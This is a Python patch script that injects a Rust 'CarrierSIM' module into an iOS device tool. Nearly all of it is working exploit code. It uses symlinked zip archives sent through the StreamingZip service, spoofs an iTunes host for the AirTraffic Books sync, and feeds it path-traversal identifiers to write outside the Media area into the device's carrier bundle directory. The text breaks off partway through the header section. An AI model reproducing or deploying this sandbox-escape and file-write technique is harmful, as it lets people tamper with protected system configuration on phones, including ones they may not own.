#!/usr/bin/env python3
from pathlib import Path
import sys

if len(sys.argv) != 2:
    raise SystemExit("usage: patch-airlift-for-carriersim.py /path/to/AirCard-iOS")

root = Path(sys.argv[1])
exploit = root / "rust-core/src/exploit.rs"
lib = root / "rust-core/src/lib.rs"
header = root / "rust-core/include/airlift.h"

exploit_text = exploit.read_text()
lib_text = lib.read_text()
header_text = header.read_text()

if "carrier_sim_transaction" in exploit_text:
    raise SystemExit("CarrierSIM patch is already applied")

carrier_rust = r'''
// ---------------------------------------------------------------------------
// CarrierSIM — transactional carrier catalog adapter
// ---------------------------------------------------------------------------

const CARRIERSIM_PARENT: &str = "/var/mobile/Library/Carrier Bundles";
const CARRIERSIM_TARGET: &str = "/var/mobile/Library/Carrier Bundles/iPhone";
const CARRIERSIM_MAX_NODES: usize = 4000;
const CARRIERSIM_MAX_BYTES: usize = 64 * 1024 * 1024;

#[derive(Clone, Debug)]
enum CarrierSIMNode {
    Directory,
    File(Vec<u8>),
    Symlink(String),
}

fn carrier_sim_is_imsi(value: &str) -> bool {
    value.len() == 15 && value.bytes().all(|b| b.is_ascii_digit())
}

fn carrier_sim_bundle(value: &str) -> Result<String, String> {
    let value = value.trim().trim_end_matches(".bundle");
    if value.is_empty()
        || !value
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'_')
    {
        return Err("Invalid carrier bundle name".into());
    }
    Ok(value.to_string())
}

async fn carrier_sim_read_tree(
    afc: &mut AfcClient,
    root: &str,
) -> Result<std::collections::BTreeMap<String, CarrierSIMNode>, String> {
    let root_info = afc
        .get_file_info(root)
        .await
        .map_err(|e| format!("Carrier catalog is unavailable: {e:?}"))?;
    if root_info.st_ifmt != "S_IFDIR" {
        return Err("Carrier catalog root is not a directory".into());
    }

    let mut tree = std::collections::BTreeMap::new();
    let mut stack = vec![(root.to_string(), String::new())];
    let mut total_bytes = 0usize;

    while let Some((directory, relative)) = stack.pop() {
        let children = afc
            .list_dir(&directory)
            .await
            .map_err(|e| format!("AFC list_dir({directory}) failed: {e:?}"))?;

        for name in children {
            if name == "." || name == ".." || name.is_empty() || name.contains('/') {
                continue;
            }

            let full = format!("{directory}/{name}");
            let rel = if relative.is_empty() {
                name.clone()
            } else {
                format!("{relative}/{name}")
            };

            if tree.len() >= CARRIERSIM_MAX_NODES {
                return Err("Carrier catalog contains too many nodes".into());
            }

            let info = afc
                .get_file_info(&full)
                .await
                .map_err(|e| format!("AFC stat({full}) failed: {e:?}"))?;

            match info.st_ifmt.as_str() {
                "S_IFDIR" => {
                    tree.insert(rel.clone(), CarrierSIMNode::Directory);
                    stack.push((full, rel));
                }
                "S_IFREG" => {
                    if info.size > CARRIERSIM_MAX_BYTES
                        || total_bytes.saturating_add(info.size) > CARRIERSIM_MAX_BYTES
                    {
                        return Err("Carrier catalog is larger than the safety limit".into());
                    }
                    let mut fd = afc
                        .open(&full, AfcFopenMode::RdOnly)
                        .await
                        .map_err(|e| format!("AFC open({full}) failed: {e:?}"))?;
                    let bytes = fd
                        .read_entire()
                        .await
                        .map_err(|e| format!("AFC read({full}) failed: {e:?}"))?;
                    let _ = fd.close().await;
                    total_bytes = total_bytes.saturating_add(bytes.len());
                    tree.insert(rel, CarrierSIMNode::File(bytes));
                }
                "S_IFLNK" => {
                    let target = info
                        .st_link_target
                        .ok_or_else(|| format!("Symlink {full} has no target"))?;
                    if target.len() > 4096 {
                        return Err(format!("Symlink target is too long: {rel}"));
                    }
                    tree.insert(rel, CarrierSIMNode::Symlink(target));
                }
                other => {
                    return Err(format!("Unsupported carrier catalog node {rel}: {other}"));
                }
            }
        }
    }

    Ok(tree)
}

fn carrier_sim_zip_options(
    mode: u32,
) -> zip::write::FileOptions<'static, zip::write::ExtendedFileOptions> {
    use zip::{write::FileOptions, CompressionMethod};
    let mut options = FileOptions::default()
        .compression_method(CompressionMethod::Stored)
        .unix_permissions(mode);
    let mode_bytes = (mode as u16).to_le_bytes();
    let _ = options.add_extra_data(0x5A53, Box::new(mode_bytes), false);
    options
}

fn carrier_sim_write_metadata(
    zip: &mut zip::ZipWriter<std::io::Cursor<&mut Vec<u8>>>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    zip.add_directory("META-INF/", carrier_sim_zip_options(0o040755))?;
    zip.start_file(
        "META-INF/com.apple.ZipMetadata.plist",
        carrier_sim_zip_options(0o100600),
    )?;
    let mut metadata = plist::Dictionary::new();
    metadata.insert("Version".into(), plist::Value::Integer(2.into()));
    let mut bytes = Vec::new();
    plist::to_writer_binary(&mut bytes, &plist::Value::Dictionary(metadata))?;
    zip.write_all(&bytes)?;
    Ok(())
}

fn carrier_sim_initial_archive(
) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    use zip::ZipWriter;

    let target_tail = CARRIERSIM_PARENT.trim_start_matches('/');
    let mut output = Vec::new();
    let mut zip = ZipWriter::new(std::io::Cursor::new(&mut output));

    carrier_sim_write_metadata(&mut zip)?;
    for directory in ["p0/", "p0/p1/", "p0/p1/p2/"] {
        zip.add_directory(directory, carrier_sim_zip_options(0o040755))?;
    }

    zip.add_symlink(
        "p0/p1/p2/link",
        format!("../../../{target_tail}"),
        carrier_sim_zip_options(0o120777),
    )?;

    let mut cursor = String::new();
    for component in target_tail.split('/') {
        if component.is_empty() {
            continue;
        }
        cursor.push_str(component);
        cursor.push('/');
        zip.add_directory(&cursor, carrier_sim_zip_options(0o040755))?;
    }

    zip.add_directory("payload/", carrier_sim_zip_options(0o040755))?;
    zip.finish()?;
    Ok(output)
}

fn carrier_sim_payload_archive(
    tree: &std::collections::BTreeMap<String, CarrierSIMNode>,
) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    use zip::ZipWriter;

    let mut output = Vec::new();
    let mut zip = ZipWriter::new(std::io::Cursor::new(&mut output));
    carrier_sim_write_metadata(&mut zip)?;
    zip.add_directory("payload/", carrier_sim_zip_options(0o040755))?;

    for (relative, node) in tree {
        if relative.is_empty()
            || relative.starts_with('/')
            || relative.split('/').any(|p| p.is_empty() || p == "." || p == "..")
        {
            return Err(format!("Unsafe carrier tree path: {relative}").into());
        }

        if matches!(node, CarrierSIMNode::Directory) {
            zip.add_directory(
                format!("payload/{relative}/"),
                carrier_sim_zip_options(0o040755),
            )?;
        }
    }

    for (relative, node) in tree {
        match node {
            CarrierSIMNode::Directory => {}
            CarrierSIMNode::File(bytes) => {
                zip.start_file(
                    format!("payload/{relative}"),
                    carrier_sim_zip_options(0o100644),
                )?;
                zip.write_all(bytes)?;
            }
            CarrierSIMNode::Symlink(target) => {
                zip.add_symlink(
                    format!("payload/{relative}"),
                    target,
                    carrier_sim_zip_options(0o120777),
                )?;
            }
        }
    }

    zip.finish()?;
    Ok(output)
}

async fn carrier_sim_stage_archive(
    tunnel: &mut AppDeviceTunnel,
    source: &str,
    archive: &[u8],
    logger: &Logger,
) -> Result<(), String> {
    let mut stream = tunnel
        .connect_service("com.apple.streaming_zip_conduit", logger)
        .await?;

    let mut init = plist::Dictionary::new();
    init.insert(
        "MediaSubdir".into(),
        plist::Value::String(source.to_string()),
    );
    let mut init_bytes = Vec::new();
    plist::to_writer_binary(&mut init_bytes, &plist::Value::Dictionary(init))
        .map_err(|e| format!("StreamingZip init encode failed: {e}"))?;

    stream
        .write_all(&(init_bytes.len() as u32).to_be_bytes())
        .await
        .map_err(|e| format!("StreamingZip init length failed: {e}"))?;
    stream
        .write_all(&init_bytes)
        .await
        .map_err(|e| format!("StreamingZip init failed: {e}"))?;
    stream
        .flush()
        .await
        .map_err(|e| format!("StreamingZip init flush failed: {e}"))?;

    stream
        .write_all(archive)
        .await
        .map_err(|e| format!("StreamingZip archive write failed: {e}"))?;
    stream
        .flush()
        .await
        .map_err(|e| format!("StreamingZip archive flush failed: {e}"))?;

    let mut length = [0u8; 4];
    stream
        .read_exact(&mut length)
        .await
        .map_err(|e| format!("StreamingZip response length failed: {e}"))?;
    let size = u32::from_be_bytes(length) as usize;
    if size > 1024 * 1024 {
        return Err("StreamingZip returned an oversized response".into());
    }
    let mut response = vec![0u8; size];
    stream
        .read_exact(&mut response)
        .await
        .map_err(|e| format!("StreamingZip response failed: {e}"))?;
    drop(stream);

    logger.log(format!(
        "carriersim: StreamingZip staged {} bytes under Media/{source}",
        archive.len()
    ));
    Ok(())
}

async fn carrier_sim_write_books(
    afc: &mut AfcClient,
    identifiers: &[String],
) -> Result<(), String> {
    let _ = afc.mk_dir("Airlock").await;
    let _ = afc.mk_dir("Airlock/Book").await;
    let _ = afc.mk_dir("Books").await;
    let _ = afc.mk_dir("Books/Sync").await;

    let books = build_books_plist(identifiers)
        .map_err(|e| format!("Books manifest build failed: {e}"))?;
    let mut fd = afc
        .open("Books/Sync/Books.plist", AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("AFC open Books.plist failed: {e:?}"))?;
    fd.write_entire(&books)
        .await
        .map_err(|e| format!("AFC write Books.plist failed: {e:?}"))?;
    let _ = fd.close().await;
    Ok(())
}

async fn carrier_sim_begin_atc(
    tunnel: &mut AppDeviceTunnel,
    logger: &Logger,
) -> Result<Box<dyn ReadWrite>, String> {
    let mut stream = tunnel.connect_service("com.apple.atc", logger).await?;

    let mut grappa_info: Option<(u32, u32, u32)> = None;
    for _ in 0..12 {
        match tokio::time::timeout(
            std::time::Duration::from_millis(1500),
            read_atc_dict(&mut stream),
        )
        .await
        {
            Ok(Ok(message)) => {
                if let Some(name) = atc_message_name(&message) {
                    logger.log(format!("carriersim: ATC initial message {name}"));
                    if name == "Capabilities" {
                        if let Some(params) =
                            message.get("Params").and_then(|v| v.as_dictionary())
                        {
                            if let Some(info) =
                                params.get("GrappaSupportInfo").and_then(|v| v.as_dictionary())
                            {
                                let version = info
                                    .get("version")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                let device_type = info
                                    .get("deviceType")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(0) as u32;
                                let protocol_version = info
                                    .get("protocolVersion")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                grappa_info =
                                    Some((version, device_type, protocol_version));
                            }
                        }
                    }
                    if name == "SyncAllowed" {
                        break;
                    }
                }
            }
            Ok(Err(_)) => break,
            Err(_) => {}
        }
    }

    let mut host_info = plist::Dictionary::new();
    host_info.insert("Type".into(), plist::Value::String("iTunes".into()));
    host_info.insert(
        "Version".into(),
        plist::Value::String("13.7.0.161".into()),
    );
    host_info.insert(
        "MacOSVersion".into(),
        plist::Value::String("15.0".into()),
    );
    host_info.insert(
        "SyncHostName".into(),
        plist::Value::String("CarrierSIM".into()),
    );
    host_info.insert(
        "LibraryID".into(),
        plist::Value::String(format!(
            "{}-{}-{}-{}-{}",
            random_hex(4),
            random_hex(2),
            random_hex(2),
            random_hex(2),
            random_hex(6)
        )),
    );
    host_info.insert(
        "SyncedDataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info.insert(
        "SyncedAssetTypes".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info.insert("Wakeable".into(), plist::Value::Boolean(false));

    let grappa = crate::grappa::generate_grappa_token(grappa_info, |line| logger.log(line));
    if let Some(ref token) = grappa {
        host_info.insert("Grappa".into(), plist::Value::Data(token.clone()));
    }

    let mut host_params = plist::Dictionary::new();
    host_params.insert(
        "HostInfo".into(),
        plist::Value::Dictionary(host_info.clone()),
    );
    host_params.insert("LocalCloudSupport".into(), plist::Value::Boolean(false));
    send_atc_dict(&mut stream, &make_atc_msg("HostInfo", 0, Some(host_params))).await?;

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    let mut request = plist::Dictionary::new();
    request.insert(
        "Dataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    request.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    request.insert("HostInfo".into(), plist::Value::Dictionary(host_info));
    if let Some(token) = grappa {
        request.insert("Grappa".into(), plist::Value::Data(token));
    }
    send_atc_dict(
        &mut stream,
        &make_atc_msg("RequestingSync", 1, Some(request)),
    )
    .await?;

    let mut ready = false;
    for _ in 0..24 {
        match tokio::time::timeout(
            std::time::Duration::from_secs(5),
            read_atc_dict(&mut stream),
        )
        .await
        {
            Ok(Ok(message)) => {
                if let Some(name) = atc_message_name(&message) {
                    if name == "Ping" {
                        let _ = send_atc_dict(&mut stream, &make_atc_msg("Pong", 1, None)).await;
                        continue;
                    }
                    if name == "ReadyForSync" || name == "AssetManifest" {
                        ready = true;
                        break;
                    }
                    if name == "SyncFailed" {
                        continue;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC read failed: {e}")),
            Err(_) => {}
        }
    }
    if !ready {
        return Err("AirTraffic did not become ready. Make sure Apple Books is installed.".into());
    }

    let mut sync_types = plist::Dictionary::new();
    sync_types.insert("Book".into(), plist::Value::Integer(1.into()));
    let mut metadata = plist::Dictionary::new();
    metadata.insert(
        "SyncTypes".into(),
        plist::Value::Dictionary(sync_types),
    );
    metadata.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    send_atc_dict(
        &mut stream,
        &make_atc_msg("FinishedSyncingMetadata", 1, Some(metadata)),
    )
    .await?;

    let mut manifest = false;
    for _ in 0..20 {
        match tokio::time::timeout(
            std::time::Duration::from_secs(5),
            read_atc_dict(&mut stream),
        )
        .await
        {
            Ok(Ok(message)) => {
                if let Some(name) = atc_message_name(&message) {
                    if name == "Ping" {
                        let _ = send_atc_dict(&mut stream, &make_atc_msg("Pong", 1, None)).await;
                        continue;
                    }
                    if name == "AssetManifest" {
                        manifest = true;
                        break;
                    }
                    if name == "SyncFailed" {
                        continue;
                    }
                    if name == "SyncFinished" {
                        break;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("ATC manifest read failed: {e}")),
            Err(_) => {}
        }
    }

    if !manifest {
        return Err("AirTraffic AssetManifest was not observed. Make sure Apple Books is installed.".into());
    }

    Ok(stream)
}

async fn carrier_sim_file_complete(
    stream: &mut Box<dyn ReadWrite>,
    identifier: &str,
    destination: &str,
) -> Result<(), String> {
    let mut params = plist::Dictionary::new();
    params.insert(
        "AssetID".into(),
        plist::Value::String(identifier.to_string()),
    );
    params.insert("Dataclass".into(), plist::Value::String("Book".into()));
    params.insert(
        "AssetPath".into(),
        plist::Value::String(destination.to_string()),
    );
    send_atc_dict(stream, &make_atc_msg("FileComplete", 1, Some(params))).await
}

async fn carrier_sim_wait_for_path(
    afc: &mut AfcClient,
    path: &str,
    should_exist: bool,
) -> bool {
    for _ in 0..80 {
        let exists = afc.get_file_info(path).await.is_ok();
        if exists == should_exist {
            return true;
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    false
}

async fn carrier_sim_import_tree(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    tree: &std::collections::BTreeMap<String, CarrierSIMNode>,
    logger: &Logger,
) -> Result<(), String> {
    let token = random_hex(10);
    let source = format!("carriersim-import-src-{token}");
    let link = format!("carriersim-import-link-{token}");

    let initial = carrier_sim_initial_archive()
        .map_err(|e| format!("CarrierSIM import archive failed: {e}"))?;
    carrier_sim_stage_archive(tunnel, &source, &initial, logger).await?;

    let payload = carrier_sim_payload_archive(tree)
        .map_err(|e| format!("CarrierSIM import payload failed: {e}"))?;
    carrier_sim_stage_archive(tunnel, &source, &payload, logger).await?;

    let identifiers = vec![
        format!("../../{source}/p0/p1/p2/link"),
        format!("../../{source}/payload"),
    ];
    carrier_sim_write_books(afc, &identifiers).await?;

    let mut atc = carrier_sim_begin_atc(tunnel, logger).await?;
    carrier_sim_file_complete(&mut atc, &identifiers[0], &link).await?;
    tokio::time::sleep(std::time::Duration::from_millis(600)).await;
    carrier_sim_file_complete(&mut atc, &identifiers[1], &format!("{link}/iPhone")).await?;
    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    drop(atc);

    let consumed = carrier_sim_wait_for_path(afc, &format!("{source}/payload"), false).await;
    let _ = afc.remove(&link).await;
    let _ = afc.remove_all(&source).await;

    if !consumed {
        return Err("CarrierSIM recovery payload was not consumed by AirTraffic".into());
    }
    Ok(())
}

async fn carrier_sim_transaction(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    imsi: &str,
    bundle: Option<&str>,
    restore_all: bool,
    logger: &Logger,
) -> Result<String, String> {
    let token = random_hex(10);
    let source = format!("carriersim-src-{token}");
    let link = format!("carriersim-link-{token}");
    let exported = format!("carriersim-saved-{token}");

    let initial = carrier_sim_initial_archive()
        .map_err(|e| format!("CarrierSIM staging archive failed: {e}"))?;
    carrier_sim_stage_archive(tunnel, &source, &initial, logger).await?;

    if afc.get_file_info(&format!("{source}/p0/p1/p2/link")).await.is_err()
        || afc.get_file_info(&format!("{source}/payload")).await.is_err()
    {
        return Err("CarrierSIM staging verification failed".into());
    }

    let identifiers = vec![
        format!("../../{source}/p0/p1/p2/link"),
        format!("../../{source}/../../Library/Carrier Bundles/iPhone"),
        format!("../../{source}/payload"),
    ];
    carrier_sim_write_books(afc, &identifiers).await?;

    let mut atc = carrier_sim_begin_atc(tunnel, logger).await?;
    carrier_sim_file_complete(&mut atc, &identifiers[0], &link).await?;
    tokio::time::sleep(std::time::Duration::from_millis(700)).await;

    logger.log("carriersim: exporting the current carrier catalog to Media");
    carrier_sim_file_complete(&mut atc, &identifiers[1], &exported).await?;

    if !carrier_sim_wait_for_path(afc, &exported, true).await {
        drop(atc);
        let _ = afc.remove(&link).await;
        let _ = afc.remove_all(&source).await;
        return Err("iOS did not export the current carrier catalog; no replacement was attempted".into());
    }

    let original = carrier_sim_read_tree(afc, &exported).await?;
    logger.log(format!(
        "carriersim: backed up {} carrier catalog nodes in Media/{exported}",
        original.len()
    ));

    let mut desired = original.clone();
    let action: String;

    if restore_all {
        let before = desired.len();
        desired.retain(|name, node| {
            !(carrier_sim_is_imsi(name) && matches!(node, CarrierSIMNode::Symlink(_)))
        });
        action = format!("removed {} IMSI aliases", before.saturating_sub(desired.len()));
    } else if let Some(bundle) = bundle {
        if !carrier_sim_is_imsi(imsi) {
            return Err("IMSI must contain exactly 15 digits".into());
        }
        if let Some(existing) = desired.get(imsi) {
            if !matches!(existing, CarrierSIMNode::Symlink(_)) {
                return Err("The IMSI path exists but is not a symlink; refusing to replace it".into());
            }
        }

        let bundle = carrier_sim_bundle(bundle)?;
        let target = format!(
            "../../../../../../System/Library/Carrier Bundles/iPhone/{bundle}.bundle"
        );
        desired.insert(imsi.to_string(), CarrierSIMNode::Symlink(target));
        action = format!("{imsi} -> {bundle}");
    } else {
        if !carrier_sim_is_imsi(imsi) {
            return Err("IMSI must contain exactly 15 digits".into());
        }
        let removed = matches!(desired.remove(imsi), Some(CarrierSIMNode::Symlink(_)));
        action = if removed {
            format!("removed IMSI alias {imsi}")
        } else {
            format!("IMSI alias {imsi} was already absent")
        };
    }

    let payload = match carrier_sim_payload_archive(&desired) {
        Ok(value) => value,
        Err(error) => {
            drop(atc);
            let recovery = carrier_sim_import_tree(tunnel, afc, &original, logger).await;
            return Err(match recovery {
                Ok(()) => format!("CarrierSIM could not build the replacement tree ({error}); original catalog restored"),
                Err(recovery_error) => format!(
                    "CarrierSIM could not build the replacement tree ({error}); backup remains at Media/{exported}; recovery also failed: {recovery_error}"
                ),
            });
        }
    };

    if let Err(stage_error) = carrier_sim_stage_archive(tunnel, &source, &payload, logger).await {
        drop(atc);
        let recovery = carrier_sim_import_tree(tunnel, afc, &original, logger).await;
        return Err(match recovery {
            Ok(()) => format!("CarrierSIM staging failed ({stage_error}); original catalog restored"),
            Err(recovery_error) => format!(
                "CarrierSIM staging failed ({stage_error}); backup remains at Media/{exported}; recovery also failed: {recovery_error}"
            ),
        });
    }

    logger.log(format!("carriersim: committing {action}"));
    let commit_result =
        carrier_sim_file_complete(&mut atc, &identifiers[2], &format!("{link}/iPhone")).await;
    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    drop(atc);

    let consumed =
        carrier_sim_wait_for_path(afc, &format!("{source}/payload"), false).await;

    if commit_result.is_err() || !consumed {
        let recovery = carrier_sim_import_tree(tunnel, afc, &original, logger).await;
        return Err(match recovery {
            Ok(()) => "CarrierSIM commit was not confirmed; original catalog restored".into(),
            Err(recovery_error) => format!(
                "CarrierSIM commit was not confirmed and automatic recovery failed. Backup remains at Media/{exported}: {recovery_error}"
            ),
        });
    }

    let _ = afc.remove(&link).await;
    let _ = afc.remove_all(&source).await;
    let _ = afc.remove_all(&exported).await;

    let result = serde_json::json!({
        "ok": true,
        "action": action,
        "target": CARRIERSIM_TARGET,
        "originalNodes": original.len(),
        "desiredNodes": desired.len(),
        "backupRemoved": true
    });
    serde_json::to_string_pretty(&result).map_err(|e| e.to_string())
}

async fn carrier_sim_operation(
    pairing_path: String,
    imsi: String,
    bundle: Option<String>,
    restore_all: bool,
    logger: &Logger,
) -> Result<String, String> {
    let pairing_bytes = std::fs::read(&pairing_path)
        .map_err(|e| format!("Failed to read pairing file at {pairing_path}: {e}"))?;
    let mut tunnel = connect_tunnel(&pairing_bytes, logger).await?;
    let mut afc = tunnel.connect_afc(logger).await?;

    let original_books = match afc
        .open("Books/Sync/Books.plist", AfcFopenMode::RdOnly)
        .await
    {
        Ok(mut fd) => {
            let bytes = fd.read_entire().await.ok();
            let _ = fd.close().await;
            bytes
        }
        Err(_) => None,
    };

    let result = carrier_sim_transaction(
        &mut tunnel,
        &mut afc,
        &imsi,
        bundle.as_deref(),
        restore_all,
        logger,
    )
    .await;

    let books_restore = if let Some(bytes) = original_books {
        let _ = afc.mk_dir("Books").await;
        let _ = afc.mk_dir("Books/Sync").await;
        match afc.open("Books/Sync/Books.plist", AfcFopenMode::WrOnly).await {
            Ok(mut fd) => {
                let write = fd.write_entire(&bytes).await;
                let _ = fd.close().await;
                write.map_err(|e| format!("Books.plist restore failed: {e:?}"))
            }
            Err(e) => Err(format!("Books.plist restore open failed: {e:?}")),
        }
    } else {
        match afc.remove("Books/Sync/Books.plist").await {
            Ok(()) => Ok(()),
            Err(_) => Ok(()),
        }
    };

    match (result, books_restore) {
        (Ok(json), Ok(())) => Ok(json),
        (Ok(_), Err(restore_error)) => Err(format!(
            "Carrier catalog changed, but the Books sync file could not be restored: {restore_error}"
        )),
        (Err(error), Ok(())) => Err(error),
        (Err(error), Err(restore_error)) => Err(format!(
            "{error}; additionally the Books sync file could not be restored: {restore_error}"
        )),
    }
}

async fn carrier_sim_lockdown_status(
    lockdown: &mut LockdownClient,
) -> Result<String, String> {
    let carrier_rows = lockdown
        .get_value(Some("CarrierBundleInfoArray"), None)
        .await
        .map_err(|e| format!("CarrierBundleInfoArray read failed: {e:?}"))?;

    let mut sims = Vec::new();
    if let Some(rows) = carrier_rows.as_array() {
        for row in rows {
            let Some(dictionary) = row.as_dictionary() else {
                continue;
            };
            let string = |key: &str| -> String {
                dictionary
                    .get(key)
                    .and_then(|value| value.as_string())
                    .unwrap_or("")
                    .to_string()
            };

            sims.push(serde_json::json!({
                "slot": string("Slot"),
                "mcc": string("MCC"),
                "mnc": string("MNC"),
                "imsi": string("InternationalMobileSubscriberIdentity"),
                "iccid": string("IntegratedCircuitCardIdentity"),
                "bundle": string("CFBundleIdentifier").trim_start_matches("com.apple.")
            }));
        }
    }

    async fn value_string(
        lockdown: &mut LockdownClient,
        key: &str,
    ) -> String {
        lockdown
            .get_value(Some(key), None)
            .await
            .ok()
            .and_then(|value| value.as_string().map(ToOwned::to_owned))
            .unwrap_or_default()
    }

    let product_type = value_string(lockdown, "ProductType").await;
    let product_version = value_string(lockdown, "ProductVersion").await;
    let build_version = value_string(lockdown, "BuildVersion").await;
    let device_class = value_string(lockdown, "DeviceClass").await;

    let result = serde_json::json!({
        "ok": true,
        "device": {
            "productType": product_type,
            "productVersion": product_version,
            "buildVersion": build_version,
            "deviceClass": device_class
        },
        "sims": sims
    });
    serde_json::to_string_pretty(&result).map_err(|e| e.to_string())
}

async fn carrier_sim_status_async(
    pairing_path: String,
    logger: &Logger,
) -> Result<String, String> {
    let pairing_bytes = std::fs::read(&pairing_path)
        .map_err(|e| format!("Failed to read pairing file at {pairing_path}: {e}"))?;
    let mut tunnel = connect_tunnel(&pairing_bytes, logger).await?;

    match &mut tunnel {
        AppDeviceTunnel::Rsd { adapter, handshake } => {
            let mut lockdown = handshake
                .connect::<LockdownClient>(adapter)
                .await
                .map_err(|e| format!("RSD lockdown connection failed: {e:?}"))?;
            carrier_sim_lockdown_status(&mut lockdown).await
        }
        AppDeviceTunnel::Lockdown {
            provider,
            pairing_file,
            ..
        } => {
            let mut lockdown = LockdownClient::connect(provider)
                .await
                .map_err(|e| format!("Lockdown connection failed: {e:?}"))?;
            lockdown
                .start_session(pairing_file)
                .await
                .map_err(|e| format!("Lockdown session failed: {e:?}"))?;
            carrier_sim_lockdown_status(&mut lockdown).await
        }
    }
}

pub unsafe fn carriersim_status(
    pairing_path: *const c_char,
    log_cb: ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "carriersim_pairing.plist");
    let ctx_usize = ctx as usize;
    let result = crate::ffi_util::run_with_large_stack("al_carriersim_status", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(carrier_sim_status_async(pairing_path, &logger))
    });

    match result {
        Ok(Ok(json)) => {
            if !out_json.is_null() {
                *out_json = cstr(json);
            }
            0
        }
        Ok(Err(error)) | Err(error) => {
            if !out_error.is_null() {
                *out_error = cstr(error);
            }
            1
        }
    }
}

pub unsafe fn carriersim_apply(
    pairing_path: *const c_char,
    imsi: *const c_char,
    bundle: *const c_char,
    log_cb: ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "carriersim_pairing.plist");
    let imsi = opt_str(imsi, "");
    let bundle = opt_str(bundle, "");
    let ctx_usize = ctx as usize;

    let result = crate::ffi_util::run_with_large_stack("al_carriersim_apply", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(carrier_sim_operation(
            pairing_path,
            imsi,
            Some(bundle),
            false,
            &logger,
        ))
    });

    match result {
        Ok(Ok(json)) => {
            if !out_json.is_null() {
                *out_json = cstr(json);
            }
            0
        }
        Ok(Err(error)) | Err(error) => {
            if !out_error.is_null() {
                *out_error = cstr(error);
            }
            1
        }
    }
}

pub unsafe fn carriersim_restore(
    pairing_path: *const c_char,
    imsi: *const c_char,
    log_cb: ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "carriersim_pairing.plist");
    let imsi = opt_str(imsi, "");
    let restore_all = imsi.is_empty();
    let ctx_usize = ctx as usize;

    let result = crate::ffi_util::run_with_large_stack("al_carriersim_restore", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(carrier_sim_operation(
            pairing_path,
            imsi,
            None,
            restore_all,
            &logger,
        ))
    });

    match result {
        Ok(Ok(json)) => {
            if !out_json.is_null() {
                *out_json = cstr(json);
            }
            0
        }
        Ok(Err(error)) | Err(error) => {
            if !out_error.is_null() {
                *out_error = cstr(error);
            }
            1
        }
    }
}

'''

exploit_marker = "// ---------------------------------------------------------------------------\n// Path helpers"
if exploit_marker not in exploit_text:
    raise SystemExit("exploit.rs insertion marker not found")
exploit_text = exploit_text.replace(exploit_marker, carrier_rust + "\n" + exploit_marker, 1)

lib_ffi = r'''
/// Read CarrierBundleInfoArray and basic device information through the paired tunnel.
#[no_mangle]
pub unsafe extern "C" fn al_carriersim_status(
    pairing_path: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        exploit::carriersim_status(pairing_path, log_cb, ctx, out_json, out_error)
    }))
    .unwrap_or(1)
}

/// Apply an IMSI -> signed system carrier bundle alias transactionally.
#[no_mangle]
pub unsafe extern "C" fn al_carriersim_apply(
    pairing_path: *const c_char,
    imsi: *const c_char,
    bundle: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        exploit::carriersim_apply(
            pairing_path,
            imsi,
            bundle,
            log_cb,
            ctx,
            out_json,
            out_error,
        )
    }))
    .unwrap_or(1)
}

/// Remove one IMSI alias, or all CarrierSIM-style root IMSI aliases when imsi is empty.
#[no_mangle]
pub unsafe extern "C" fn al_carriersim_restore(
    pairing_path: *const c_char,
    imsi: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        exploit::carriersim_restore(
            pairing_path,
            imsi,
            log_cb,
            ctx,
            out_json,
            out_error,
        )
    }))
    .unwrap_or(1)
}

'''

lib_marker = "/// Free any `*mut c_char` returned by this library."
if lib_marker not in lib_text:
    raise SystemExit("lib.rs insertion marker not found")
lib_text = lib_text.replace(lib_marker, lib_ffi + lib_marker, 1)

header_ffi = r'''
// ---------------------------------------------------------------------------
// CarrierSIM
